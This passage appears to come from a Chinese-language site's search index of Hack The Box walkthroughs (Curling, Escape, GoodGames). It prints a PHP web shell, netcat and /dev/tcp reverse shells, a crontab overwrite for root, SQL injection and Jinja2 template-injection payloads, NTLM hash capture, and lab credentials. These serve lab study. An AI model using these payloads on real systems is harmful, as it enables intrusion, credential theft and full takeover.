250\n\nHost script results:\n|_clock-skew: 59m59s\n| unusual-port: \n|_  WARNING: this script depends on Nmap's service/version detection (-sV)\n|_fcrdns: FAIL (No PTR record)\n| port-states: \n|   tcp: \n|_    open: 80\n| dns-blacklist: \n|   SPAM\n|     list.quorum.to - FAIL\n|_    l2.apews.org - FAIL\n\nNSE: Script Post-scanning.\nInitiating NSE at 12:22\nCompleted NSE at 12:22, 0.00s elapsed\nInitiating NSE at 12:22\nCompleted NSE at 12:22, 0.00s elapsed\nPost-scan script results:\n| reverse-index: \n|_  80/tcp: 10.129.105.207, 10.129.105.207\nRead data files from: /usr/bin/../share/nmap\nNmap done: 2 IP addresses (2 hosts up) scanned in 63.92 seconds\n\n</code></pre> <pre><code>$ searchsploit Apache 2.4.29\n&lt;SNIP&gt;\npache HTTP Server 2.4.49 - Path Traversal &amp; Remote Code Execution (RCE)                                    | multiple/webapps/50383.sh\n\n</code></pre> <p>\u53d1\u73b0\u4e3b\u9875 html \u6e90\u7801 <code>secret.txt</code> \u6ce8\u91ca\uff0c\u8bbf\u95ee\u67e5\u770b</p> <pre><code>view-source:http://10.129.106.27/\n</code></pre> <p>![[Pasted image 20221012193728.png]]</p> <pre><code>$ curl -s http://$target/secret.txt | base64 -d\nCurling2018!\n</code></pre> <p>\u524d\u5f80 http://10.129.106.27/administrator \u76ee\u5f55\u4e0b\u4f7f\u7528\u7528\u6237 <code>Floris</code> \u5bc6\u7801 <code>Curling2018!</code> \u767b\u9646</p>"},{"location":"HTB/HTB-Curling/#foothold","title":"Foothold(\u7acb\u8db3\u70b9)","text":""},{"location":"HTB/HTB-Curling/#web","title":"Web","text":"<p>Joomla CMS \u6258\u7ba1\u7684\u51b0\u58f6\u7f51\u7ad9\uff1a \u5e16\u5b50\u7531 <code>Super User</code> \u7f16\u5199\uff0c\u5176\u4e2d\u4e00\u7bc7\u7f72\u540d <code>Floris</code> \u9996\u9875HTML\u6e90\u7801\u4e2d\u542b\u6709\u4e00\u6761\u6ce8\u91ca</p> <pre><code>&lt;SNIP&gt;\n&lt;/body&gt;\n    &lt;!-- secret.txt --&gt;\n&lt;/html&gt;\n</code></pre> <p>\u8bbf\u95ee\u53ef\u83b7\u53d6\u4e00\u6bb5base64\u52a0\u5bc6\u5b57\u6bb5\uff0c\u7ecf\u8fc7 <code>base64</code> \u89e3\u5bc6\u540e\u53d6\u5f97\u7f51\u7ad9\u540e\u53f0\u5bc6\u7801</p> <pre><code>$echo 'Q3VybGluZzIwMTgh' | base64 -d\nCurling2018!\n</code></pre> <p>\u641c\u7d22 Joomla CMS \u76f8\u5173\u4fe1\u606f\u53ef\u4ee5\u5f97\u77e5\u7ba1\u7406\u9762\u677f\u8def\u5f84\u4e3a<code>/administrator</code>\uff0c\u4ee5 floris \u8eab\u4efd\u6210\u529f\u767b\u9646</p>"},{"location":"HTB/HTB-Curling/#www-data-shell","title":"\u83b7\u53d6 www-data shell","text":"<p>\u5bfb\u627e\u5199\u5165 php \u4ee3\u7801\u7684\u5730\u65b9 \u8f6c\u5230 Extensions -&gt; Templates </p> <p>\u65b0\u5efa\u6216\u5bfb\u627e php \u6587\u4ef6\uff0c\u5199\u5165 php shell\uff0c\u4fdd\u5b58\u3002</p> <pre><code>&lt;?php system($_REQUEST['pwn']); ?&gt;\n</code></pre> <p>\u8bbf\u95ee\u8be5\u9875\u9762\u6d4b\u8bd5 shell\uff0c\u83b7\u53d6\u53cd\u5411 shell <code>http://10.129.106.116/templates/beez3/dark.php?pwn=id</code></p> <p>![[Curling_www-data.png]]</p> <pre><code>$ curl http://10.129.106.116/templates/beez3/dark.php -G --data-urlencode 'pwn=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.2 1234 &gt;/tmp/f '\n\n$ rlwrap nc -lvp 1234\nNcat: Version 7.92 ( https://nmap.org/ncat )\nNcat: Listening on :::1234\nNcat: Listening on 0.0.0.0:1234\nNcat: Connection from 10.129.106.116.\nNcat: Connection from 10.129.106.116:42390.\n/bin/sh: 0: can not access tty; job control turned off\nwhoami\nwww-data\n\n$ python3 -c \"import pty;pty.spawn('/bin/bash')\"\nwww-data@curling:/var/www/html/templates/beez3$ ll\n\n</code></pre>"},{"location":"HTB/HTB-Curling/#lateral-movement","title":"LATERAL MOVEMENT(\u6a2a\u5411\u79fb\u52a8)","text":""},{"location":"HTB/HTB-Curling/#hex-dump","title":"HEX DUMP","text":"<p>Navigating(\u5bfc\u822a) <code>/home/floris</code> \u6587\u4ef6\u5939\u4e0b\u627e\u5230 <code>password_backup</code></p> <pre><code>$ cat password_backup\n00000000: 425a 6839 3141 5926 5359 819b bb48 0000  BZh91AY&amp;SY...H..\n00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34  ....A...P)ava.:4\n&lt;SNIP&gt;\n\n$ cp password_backup /tmp &amp;&amp; cat /tmp/password_backup | xxd -r &gt; /tmp/bak\n\n$ file bak\nbak: bzip2 compressed data, block size = 900k\n\n</code></pre> <p>\u591a\u6b21\u538b\u7f29\u6587\u4ef6\uff0c\u89e3\u538b\u65b9\u5f0f\uff1a</p> <pre><code>$ bzip2 -d bak\nbzip2: Can not guess original name for bak -- using bak.out\n$ file bak.out\nbak.out: gzip compressed data, was \"password\", last modified: Tue May 22 19:16:20 2018, from Unix\n\n$ mv bak.out bak.gz\n\n$ gzip -d bak.gz\n\n$ file bak\nak: bzip2 compressed data, block size = 900k\n\n$ bzip2 -d bak\nbzip2: Can not guess original name for bak -- using bak.out\n\n$ file bak.out\nak.out: POSIX tar archive (GNU)\n\n$ tar xf bak.out\n\n$ cat password.txt\n5d&lt;wdCbdZu)|hChXll    #floris SSH \u5bc6\u7801\n</code></pre> <pre><code>$ ssh floris@10.129.106.116\nLast login: Wed Sep  8 11:42:07 2021 from 10.10.14.15\nfloris@curling:~$ whoami\nfloris\n\n</code></pre>"},{"location":"HTB/HTB-Curling/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"HTB/HTB-Curling/#enumeration_1","title":"Enumeration","text":"<p>\u4f7f\u7528\u5de5\u5177  pspy \u4e0b\u8f7d\u8f83\u5c0f\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u5e76\u5c06\u5176\u4f20\u8f93\u5230\u76d2\u5b50\u4e2d</p> <pre><code>$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.0.0/pspy64s\n\n$ scp pspy64s floris@10.129.106.116:/tmp\n$ cd /tmp\n$ chmod +x pspy64s\n./pspy64s\n/bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report \n2022/10/14 10:50:01 CMD: UID=0    PID=2664   | /bin/sh -c sleep 1; cat /root/default.txt &gt; /home/floris/admin-area/input \n2022/10/14 10:50:01 CMD: UID=0    PID=2663   | /usr/sbin/CRON -f \n2022/10/14 10:50:01 CMD: UID=0    PID=2662   | /usr/sbin/CRON -f \n2022/10/14 10:50:01 CMD: UID=0    PID=2667   | curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report\n</code></pre> <p>\u53d1\u73b0 cron \u5728\u8fd0\u884c\uff0c\u00a0curl  <code>-K</code> \u9009\u9879\u7528\u4e8e\u6307\u5b9a\u914d\u7f6e\u6587\u4ef6\uff0ccron \u4f7f\u7528\u8f93\u5165\u4f5c\u4e3a\u914d\u7f6e\u548c\u8f93\u51fa\u62a5\u544a\u3002</p> <pre><code>$ cat /home/floris/admin-area/input \nurl = \"http://127.0.0.1\"\n\n$ ls -la /home/floris/admin-area/input \n-rw-rw---- 1 root floris 25 Oct 14 11:00 /home/floris/admin-area/input\n\n\n</code></pre> <p>\u8f93\u5165\u6587\u4ef6\u5f52\u5f53\u524d\u7ec4\u6240\u6709\uff0c\u53ef\u4ee5\u7f16\u5199\u81ea\u5df1\u7684\u914d\u7f6e\u3002output\u53ef\u6307\u5b9a\u8f93\u51fa\u6587\u4ef6\u3002\u521b\u5efa\u4e00\u4e2a\u6076\u610f\u7684 crontab \u5e76\u8986\u76d6 <code>input</code></p>"},{"location":"HTB/HTB-Curling/#_1","title":"\u64cd\u4f5c\u914d\u7f6e","text":"<p>\u9996\u5148\u672c\u5730\u673a\u5668\u65b0\u5efa\u6076\u610f crontab \u6587\u4ef6\uff0c\u5e76\u542f\u52a8\u4e00\u4e2a\u7b80\u5355\u7684 http \u670d\u52a1\u5668</p> <pre><code>$ cp /etc/crontab .\n$ echo '* * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.2 1234 &gt;/tmp/f ' &gt;&gt; crontab\npython3 -m http.server 80\n</code></pre> <p>floris \u7528\u6237\u4e0b\u4fee\u6539 input \u6587\u4ef6\u5185\u5bb9\uff0curl \u6307\u5411\u672c\u5730\u673a\u5668 crontab \u6076\u610f\u6587\u4ef6</p> <pre><code>url = \"http://10.10.14.20/crontab\"\noutput = \"/etc/crontab\"\n</code></pre> <p>\u5efa\u7acb\u76d1\u542c\uff0c\u67e5\u770b input \u6587\u4ef6\u4ee5\u5199\u5165\u5230 curl \u4e2d\uff0c\u7b49\u5f85 shell \u56de\u8fde</p> <pre><code>$ nc -lvp 1234\n\n$ cat input\n</code></pre> <p>\u6210\u529f\u83b7\u53d6 Root \u6743\u9650 ```shell $ nc -lvp 1234 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::1234 Ncat: Listening on 0.0.0.0:1234 Ncat: Connection from 10.129.106.157. Ncat: Connection from 10.129.106.157:36182. /bin/sh: 0: can not access tty; job control turned off</p>"},{"location":"HTB/HTB-Curling/#whoami","title":"whoami","text":"<p>root ```h</p>"},{"location":"HTB/HTB-Escape/","title":"HTB-Escape","text":""},{"location":"HTB/HTB-Escape/#_1","title":"\u6982\u8981","text":"<p><code>Escap</code> \u662f\u4e00\u4e2a\u4e2d\u7b49\u96be\u5ea6\u7684 <code>Windwos Active Directory</code> \u673a\u5668\uff0c\u4ee5 <code>SMB</code> \u5171\u4eab\u542f\u52a8\uff0c\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\u6765\u5bbe\u7528\u6237\u53ef\u4ee5\u4e0b\u8f7d\u654f\u611f\u7684 <code>PDF \u6587\u4ef6</code>\u3002PDF \u6587\u4ef6\u5185\u7684\u4e34\u65f6\u51ed\u636e\u53ef\u7528\u4e8e\u8bbf\u95ee\u8ba1\u7b97\u673a\u8fd0\u884c\u7684 <code>MSSQL</code> \u670d\u52a1\u3002\u653b\u51fb\u8005\u80fd\u591f\u63a7\u5236 <code>MSSQL</code> \u670d\u52a1\u5bf9\u5176\u8ba1\u7b97\u673a\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u5e76\u6355\u83b7 <code>HASH</code>\u3002\u4e8b\u5b9e\u8bc1\u660e\uff0c\u8be5\u670d\u52a1\u6b63\u5728\u7528\u6237\u8d26\u6237\u4e0b\u8fd0\u884c\uff0c\u5e76\u4e14 HASH \u662f\u53ef\u7834\u89e3\u7684\u3002\u62e5\u6709\u4e00\u7ec4\u6709\u6548\u7684\u51ed\u636e\u540e\uff0c\u653b\u51fb\u8005\u80fd\u591f\u4f7f\u7528 <code>WinRM</code> \u5728\u8ba1\u7b97\u673a\u4e0a\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u3002\u679a\u4e3e\u8ba1\u7b97\u673a\u65f6\uff0c\u65e5\u5fd7\u6587\u4ef6\u4f1a\u663e\u793a\u7528\u4e8e\u8fdb\u4e00\u6b65\u679a\u4e3e\u8ba1\u7b97\u673a\u7684\u51ed\u636e\uff0c\u663e\u793a\u5b58\u5728\u8bc1\u4e66\u9881\u53d1\u673a\u6784\u548c\u7528\u6237 <code>ryan.cooper</code>\u3002\u4f7f\u7528 <code>Certify</code> \u5de5\u5177\u53ef\u4ee5\u68c0\u6d4b\u5230\u4e00\u4e2a\u8bc1\u4e66\u6a21\u677f\u5bb9\u6613\u53d7\u5230 <code>ESC1</code> \u653b\u51fb\uff0c\u8fd9\u610f\u5473\u7740\u80fd\u591f\u4f7f\u7528\u6b64\u6a21\u677f\u7684\u7528\u6237\u53ef\u4ee5\u5bf9\u57df\u4e2d\u4efb\u4f55\u7528\u6237\u8bf7\u6c42\u8bc1\u4e66\u3002\u56e0\u6b64\uff0c\u5229\u7528 ESC1 \u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u80fd\u591f\u83b7\u53d6\u7ba1\u7406\u5458\u8d26\u6237\u7684\u6709\u6548\u8bc1\u4e66\uff0c\u7136\u540e\u4f7f\u7528\u5b83\u6765\u83b7\u53d6\u7ba1\u7406\u5458\u7528\u6237\u7684 HASH\u3002</p>"},{"location":"HTB/HTB-Escape/#smb","title":"SMB \u4fe1\u606f\u6cc4\u9732","text":"<p>\u679a\u4e3e\u4e3b\u673a smb \u4fe1\u606f</p> <pre><code>smbclient -L \\\\\\\\ sequel.htb\\\\\n</code></pre> <p>\u767b\u5f55 public \u8d26\u6237</p> <pre><code>smbclient \\\\\\\\sequel\\\\public\n</code></pre> <p>\u5728 PDF \u6587\u4ef6\u91cc\u627e\u5230\u7528\u6237\u8d26\u6237\u4fe1\u606f</p> <pre><code>smb: \\&gt; ls\nSQL Server Procedures.pdf\n</code></pre> <p>\u4f7f\u7528 impacket MsSQL\u5ba2\u6237\u7aef\u8fde\u63a5</p> <pre><code>impacket-mssqlclient PublicUser:GuestUserCantWrite1@sequal.htb\n</code></pre> <p>\u5728\u673a\u5668\u4e0a\u76d1\u542c\u7f51\u5361</p> <pre><code>responder -I tun0 -v\n</code></pre> <p>\u5728 MsSQL \u4e0a\u5f3a\u5236\u6267\u884c\u67d0\u67d0\u00b7</p> <pre><code>EXEC MASTER.sys.xp_dirtree '\\\\10.10.14.4\\test', 1, 1\n</code></pre> <p>\u76d1\u542c\u5230\u4e86\u4f1a\u8fde\u7684 Hash\uff0c\u4f7f\u7528 John \u7834\u89e3\u3002</p> <pre><code>john --wordlist=/../rockyou.txt hash\n</code></pre> <p>\u5f97\u5230\u7cfb\u7edf\u8d26\u6237\u5bc6\u7801 sql_srv:REGGIE1234ronnie</p> <p>ls C:\\users</p> <p>\u4f7f\u7528 evil-winrm \u8fde\u63a5 Windows \u547d\u4ee4\u884c</p> <pre><code>evil-winrm -i sequel.htb -u ryan.cooper -p NuclearMosquito3\n</code></pre>"},{"location":"HTB/HTB-Goodgame/","title":"HTB Goodgame","text":"<p>24th January 2022 / Document No. D22.100.154 Prepared By: TheCyberGeek Machine Author(s): TheCyberGeek Difficulty: Easy Classification: Confidential</p>"},{"location":"HTB/HTB-Goodgame/#synopsis","title":"Synopsis","text":"<p>GoodGames \u662f\u4e00\u6b3e Easy linux \u673a\u5668\uff0c\u5b83\u5c55\u793a\u4e86\u6e05\u7406 Web \u5e94\u7528\u7a0b\u5e8f\u4e2d\u7684\u7528\u6237\u8f93\u5165\u4ee5\u9632\u6b62 SQL \u6ce8\u5165\u653b\u51fb\u7684\u91cd\u8981\u6027\uff0c\u5728\u6570\u636e\u5e93\u7ed3\u6784\u4e2d\u4f7f\u7528\u5f3a\u5927\u7684\u54c8\u5e0c\u7b97\u6cd5\u6765\u9632\u6b62\u4ece\u53d7\u635f\u6570\u636e\u5e93\u4e2d\u63d0\u53d6\u548c\u7834\u89e3\u5bc6\u7801\uff0c\u4ee5\u53ca\u5bc6\u7801\u91cd\u65b0\u653b\u51fb\u7684\u5371\u9669 -\u5229\u7528\u3002 \u5b83\u8fd8\u5f3a\u8c03\u4e86\u5728\u53cd\u6620\u7528\u6237\u8f93\u5165\u7684 Python Web \u5e94\u7528\u7a0b\u5e8f\u4e2d\u4f7f\u7528 render_template_string \u7684\u5371\u9669\uff0c\u4ece\u800c\u5141\u8bb8\u670d\u52a1\u5668\u7aef\u6a21\u677f\u6ce8\u5165 (SSTI) \u653b\u51fb\u3002 \u6743\u9650\u63d0\u5347\u6d89\u53ca docker hosts \u679a\u4e3e\uff0c\u5e76\u5c55\u793a\u4e86\u5728\u5bb9\u5668\u4e2d\u62e5\u6709\u7ba1\u7406\u5458\u6743\u9650\u548c\u5728\u4e3b\u673a\u4e0a\u62e5\u6709\u4f4e\u6743\u9650\u7528\u6237\u662f\u591a\u4e48\u5371\u9669\uff0c\u4ece\u800c\u5141\u8bb8\u653b\u51fb\u8005\u63d0\u5347\u6743\u9650\u4ee5\u5371\u53ca\u7cfb\u7edf\u3002</p>"},{"location":"HTB/HTB-Goodgame/#skill-required","title":"Skill Required","text":"<ul> <li>Web Enumeration </li> <li>Basic Web Exploitation Skills</li> <li>Basic Hash Cracking Skills</li> <li>Understanding(\u7406\u89e3) \u4e86\u89e3 of Detection(\u68c0\u6d4b) &amp; Exploitation of SSTI</li> <li>Understanding of Basic Docker Security Concepts(\u6982\u5ff5)</li> </ul>"},{"location":"HTB/HTB-Goodgame/#skills-learned","title":"Skills Learned","text":"<ul> <li>Exploiting Union-Based SQL Injections</li> <li>Hash Cracking Weak Algorithms(\u5f31\u7b97\u6cd5)</li> <li>Password Reuse</li> <li>Exploiting SSTI</li> <li>Basics of Docker Breakouts(\u7a81\u7834)</li> </ul>"},{"location":"HTB/HTB-Goodgame/#enumeration","title":"Enumeration","text":""},{"location":"HTB/HTB-Goodgame/#ports-scan","title":"Ports Scan","text":"<pre><code>$ sudo masscan -p1-65535 -e tun0 --rate=1000 $target &gt;my_data/goodgame_ports\n\nDiscovered open port 80/tcp on 10.129.96.71\n\n$ nmap -sC -sV $target\n\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Apache httpd 2.4.48\n|_http-title: GoodGames | Community and Store\n|_http-server-header: Werkzeug/2.0.2 Python/3.9.2\nService Info: Host: goodgames.htb\n</code></pre> <p>Nmap scan shows that only port 80 hosting a Python 3.9.2 application is listening</p>"},{"location":"HTB/HTB-Goodgame/#goodgameshtb-python-webserver","title":"goodgames.htb - Python Webserver","text":"<p>Browsing to port 80 we see a gaming based website. ![[Pasted image 20221027105008.png]]</p> <pre><code>$ echo '10.129.96.71 goodgame.htb' | sudo tee -a /etc/hosts\n</code></pre>"},{"location":"HTB/HTB-Goodgame/#banner","title":"Banner","text":"<pre><code>$ curl goodgame.htb -I\nHTTP/1.1 200 OK\nDate: Thu, 27 Oct 2022 02:03:59 GMT\nServer: Werkzeug/2.0.2 Python/3.9.2\nContent-Type: text/html; charset=utf-8\nContent-Length: 85107\n</code></pre>"},{"location":"HTB/HTB-Goodgame/#python-webserver","title":"Python WebServer","text":"<p>\u68c0\u67e5\u767b\u5f55\u529f\u80fd\uff0c\u6211\u4eec\u5c1d\u8bd5\u7b80\u5355\u7684 SQL \u6ce8\u5165\u4f5c\u4e3a\u57fa\u672c\u68c0\u67e5\u7684\u4e00\u90e8\u5206\uff0c\u5305\u62ec <code>admin' \u6216 1 = 1 -- -</code> \u5e76\u770b\u5230\u6211\u4eec\u9700\u8981\u8f93\u5165\u6709\u6548\u7684\u7535\u5b50\u90ae\u4ef6\u5730\u5740\u3002 ![[Pasted image 20221028202725.png]] \u5728 BurpSuite \u4e2d\u6355\u83b7\u6709\u6548\u7684\u7535\u5b50\u90ae\u4ef6\u767b\u5f55\u8bf7\u6c42\u5e76\u624b\u52a8\u5c06\u7535\u5b50\u90ae\u4ef6\u66f4\u6539\u4e3a<code>admin' and 1 = 1 -- -</code> \u6709\u6548\u8d1f\u8f7d\u7136\u540e\u70b9\u51fb\u767b\u5f55\uff0c\u6211\u4eec\u4f1a\u770b\u5230\u6b22\u8fce\u7ba1\u7406\u5458\u7684\u54cd\u5e94\u3002 ![[Pasted image 20221028202836.png]]</p>"},{"location":"HTB/HTB-Goodgame/#sql-injection","title":"SQL Injection","text":"<p>\u5728\u68c0\u6d4b\u5230\u7528\u4e8e\u7ed5\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\u6709\u6548 SQL \u6ce8\u5165\u540e\uff0c\u6211\u4eec\u5c06\u7535\u5b50\u90ae\u4ef6\u6539\u56de <code>admin@goodgames.htb</code> \u5e76\u5c06\u8bf7\u6c42\u4fdd\u5b58\u5230\u540d\u4e3a <code>goodgames.req</code> \u7684\u6587\u4ef6\u4e2d\u3002\u4f7f\u7528 SQLMap \u679a\u4e3e\u6570\u636e\u5e93\u3002</p> <pre><code>$ sqlmap -r goodgames.req\n[13:33:48] [INFO] testing 'Generic UNION query (55) - 1 to 10 columns'\n[13:33:49] [WARNING] POST parameter 'password' does not seem to be injectable\nsqlmap identified the following injection point(s) with a total of 208 HTTP(s) requests:\n---\nParameter: email (POST)\n    Type: time-based blind\n    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: email=admin@goodgames.htb' AND (SELECT 8700 FROM (SELECT(SLEEP(5)))HRXj) AND 'pnzX'='pnzX&amp;password=123456\n\nsqlmap -r goodgames.htb --dbs\navailable databases [2]:\n[*] information_schema\n[*] main\n\n$ sqlmap -r my_data/goodgames.req -D main --tables  --batch\nDatabase: main\n[3 tables]\n+---------------+\n| user          |\n| blog          |\n| blog_comments |\n+---------------+\n\n$ sqlmap -r my_data/goodgames.req -D main -T user --dump  --batch\nDatabase: main\nTable: user\n[1 entry]\n+----+-------+---------------------+----------------------------------+\n| id | name  | email               | password                         |\n+----+-------+---------------------+----------------------------------+\n| 1  | admin | admin@goodgames.htb | 2b22337f218b2d82dfc3b6f77e7cb8ec |\n+----+-------+---------------------+----------------------------------+\n\n</code></pre> <p>\u516c\u5f00\u7684\u662f\u7ba1\u7406\u5458\u7684\u5bc6\u7801\u54c8\u5e0c\u3002\u4f7f\u7528 md5\u89e3\u5bc6\u7f51\u7ad9 \u6211\u4eec\u53ef\u4ee5\u7834\u89e3\u54c8\u5e0c <code>superadministrator</code></p> <p>\u5728\u4ee5\u7ba1\u7406\u5458\u8eab\u4efd\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u540e\uff0c\u4f7f\u7528 BurpSuite \u4e2d\u7ee7\u5668\u9009\u9879\u5361\u4e2d\u7684 cookie\uff0c\u6211\u4eec\u67e5\u770b\u7ba1\u7406\u5458\u5e10\u6237\uff0c\u5e76\u5728\u9875\u9762\u53f3\u4e0a\u89d2\u770b\u5230\u4e00\u4e2a cog\u3002\u5355\u51fb cog \u4f1a\u5c06\u6211\u4eec\u91cd\u5b9a\u5411\u5230\u4e00\u4e2a\u540d\u4e3a <code>internal-administration.goodgames.htb</code> \u7684\u65b0\u5b50\u57df\u3002\u8ba9\u6211\u4eec\u5c06\u6b64\u5b50\u57df\u6dfb\u52a0\u5230\u6211\u4eec\u7684 /etc/hosts \u6587\u4ef6\u4e2d\u4ee5\u5141\u8bb8\u8bbf\u95ee\u8be5\u7ad9\u70b9\u3002</p> <pre><code>$ sudo sed -i 's/goodgames.htb/goodgames.htb internaladministration.goodgames.htb/g' /etc/hosts\n</code></pre> <p>\u5f53\u8bbf\u95ee\u65b0\u7684\u5b50\u57df\u65f6\uff0c\u6211\u4eec\u4f1a\u770b\u5230\u4e00\u4e2a Flask Dashboard \u767b\u5f55\u9875\u9762\u3002 ![[Pasted image 20221028210327.png]] \u7ba1\u7406\u5458\u4e5f\u53ef\u80fd\u4e3a\u6b64\u5e94\u7528\u7a0b\u5e8f\u91cd\u65b0\u4f7f\u7528\u4e86\u4ed6\u4eec\u7684\u51ed\u636e\u3002\u8f93\u5165\u7528\u6237\u540d admin \u548c\u5bc6\u7801 superadministrator \u6210\u529f\u9a8c\u8bc1\u4e86\u6211\u4eec\u5bf9\u5e94\u7528\u7a0b\u5e8f\u7684\u8eab\u4efd\u3002 ![[Pasted image 20221028210337.png]]</p>"},{"location":"HTB/HTB-Goodgame/#ssti","title":"SSTI","text":"<p>\u5bfc\u822a\u5230\u8bbe\u7f6e\u9875\u9762\uff0c\u6211\u4eec\u6ce8\u610f\u5230\u6211\u4eec\u53ef\u4ee5\u7f16\u8f91\u6211\u4eec\u7684\u7528\u6237\u8be6\u7ec6\u4fe1\u606f\u3002\u7531\u4e8e\u8fd9\u662f\u4e00\u4e2a Python Flask \u5e94\u7528\u7a0b\u5e8f\uff0c\u8fd9\u5c06\u662f\u6d4b\u8bd5\u670d\u52a1\u5668\u7aef\u6a21\u677f\u6ce8\u5165\u8868\u5355\u7684\u597d\u65f6\u673a\u3002\u5c06\u7528\u6237\u540d\u66f4\u6539\u4e3a <code>{{7*7}}</code> \u540e\uff0c\u6211\u4eec\u770b\u5230\u6211\u4eec\u7684\u7528\u6237\u540d\u5df2\u66f4\u6539\u4e3a 49\uff0c\u5e76\u4e14\u6211\u4eec\u7684 SSTI \u6709\u6548\u8d1f\u8f7d\u5df2\u6267\u884c\u3002 ![[Pasted image 20221028210415.png]]</p> <p>\u5728\u8fd9\u4e2a\u9636\u6bb5\uff0c\u6211\u4eec\u77e5\u9053\u8be5\u7ad9\u70b9\u6613\u53d7 SSTI \u653b\u51fb\uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u6ce8\u5165\u6709\u6548\u8d1f\u8f7d\u5e76\u83b7\u53d6 shell\u3002\u9996\u5148\uff0c\u6211\u4eec\u5bf9\u6211\u4eec\u7684\u6709\u6548\u8d1f\u8f7d\u8fdb\u884c base64 \u7f16\u7801\uff0c\u7136\u540e\u5728\u672c\u5730\u542f\u52a8\u4e00\u4e2a\u4fa6\u542c\u5668\u3002</p> <pre><code>$ echo -ne 'bash -i &gt;&amp; /dev/tcp/10.10.14.42/9999 0&gt;&amp;1' | base64\nYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40Mi85OTk5IDA+JjE=\n\n$ nc -lvvp 4444\n</code></pre> <p>\u7136\u540e\u6211\u4eec\u6784\u5efa\u4e00\u4e2a\u57fa\u672c\u7684 SSTI \u6709\u6548\u8f7d\u8377\uff0c\u901a\u8fc7\u540d\u79f0\u5b57\u6bb5\u5728\u73b0\u573a\u4ea4\u4ed8\u3002</p> <pre><code>{{config.__class__.__init__.__globals__['os'].popen('echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40Mi85OTk5IDA+JjE=${IFS}|base64${IFS}-d|bash').read()}}\n</code></pre> <p>\u73b0\u5728\u6211\u4eec\u53ef\u4ee5\u8fdb\u5165\u7528\u6237\u76ee\u5f55\u5e76\u8bbf\u95ee\u6807\u5fd7\u3002</p>"},{"location":"HTB/HTB-Goodgame/#privilege-escalation-via-docker-escape","title":"Privilege Escalation via Docker Escape","text":"<p>\u5728\u7cfb\u7edf\u4e0a\u83b7\u5f97\u4e00\u4e2a shell \u540e\uff0c\u6211\u4eec\u5f88\u5feb\u6ce8\u610f\u5230\u6211\u4eec\u5728\u4e00\u4e2a Docker \u5bb9\u5668\u4e2d\u3002</p> <pre><code>root@3a453ab39d3d:/home/augustus# ls -la\nls -la\ntotal 24\ndrwxr-xr-x 2 1000 1000 4096 Nov  3  2021 .\ndrwxr-xr-x 1 root root 4096 Nov  5  2021 ..\nlrwxrwxrwx 1 root root    9 Nov  3  2021 .bash_history -&gt; /dev/null\n-rw-r--r-- 1 1000 1000  220 Oct 19  2021 .bash_logout\n-rw-r--r-- 1 1000 1000 3526 Oct 19  2021 .bashrc\n-rw-r--r-- 1 1000 1000  807 Oct 19  2021 .profile\n-rw-r----- 1 1000 1000   33 Oct 31 07:01 user.txt\n\n</code></pre> <p>\u7528\u6237 augustus \u4e3b\u76ee\u5f55\u7684\u76ee\u5f55\u5217\u8868\u663e\u793a\uff0cUID 1000\u663e\u793a\u4e3a\u53ef\u7528\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u7684\u6240\u6709\u8005\uff0c\u800c\u4e0d\u662f\u5176\u540d\u79f0\u3002\u8fd9\u63d0\u793a\u7528\u6237\u7684\u4e3b\u76ee\u5f55\u5df2\u4ece\u4e3b\u7cfb\u7edf\u88c5\u5165docker\u5bb9\u5668\u4e2d\u3002\u901a\u8fc7\u68c0\u67e5\u88c5\u8f7d\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u4e3b\u673a\u4e0a\u7684\u7528\u6237\u76ee\u5f55\u786e\u5b9e\u5728\u542f\u7528\u8bfb/\u5199\u6807\u5fd7\u7684\u60c5\u51b5\u4e0b\u88c5\u8f7d\u3002</p> <pre><code>root@3a453ab39d3d:/home/augustus# mount\nmount\n&lt;SNIP&gt;\n/dev/sda1 on /home/augustus type ext4 (rw,relatime,errors=remount-ro)\n/dev/sda1 on /etc/resolv.conf type ext4 (rw,relatime,errors=remount-ro)\n/dev/sda1 on /etc/hostname type ext4 (rw,relatime,errors=remount-ro)\n/dev/sda1 on /etc/hosts type ext4 (rw,relatime,errors=remount-ro)\n&lt;SNIP&gt;\n</code></pre> <p>\u53ef\u7528\u7f51\u7edc\u9002\u914d\u5668\u7684\u679a\u4e3e\u663e\u793a\u5bb9\u5668 IP \u4e3a 172.19.0.2 \u3002 Docker \u901a\u5e38\u5728\u9ed8\u8ba4\u914d\u7f6e\u4e2d\u5c06\u5b50\u7f51\u7684\u7b2c\u4e00\u4e2a\u5730\u5740\u5206\u914d\u7ed9\u4e3b\u673a\u7cfb\u7edf\uff0c\u56e0\u6b64 172.19.0.2 \u53ef\u80fd\u662f\u4e3b\u673a\u7684\u5185\u90e8 Docker IP \u5730\u5740\u3002</p> <pre><code>root@3a453ab39d3d:/home/augustus# ifconfig\nifconfig\neth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500\n        inet 172.19.0.2  netmask 255.255.0.0  broadcast 172.19.255.255\n        ether 02:42:ac:13:00:02  txqueuelen 0  (Ethernet)\n        RX packets 2023  bytes 324031 (316.4 KiB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 1677  bytes 2188621 (2.0 MiB)\n        TX errors 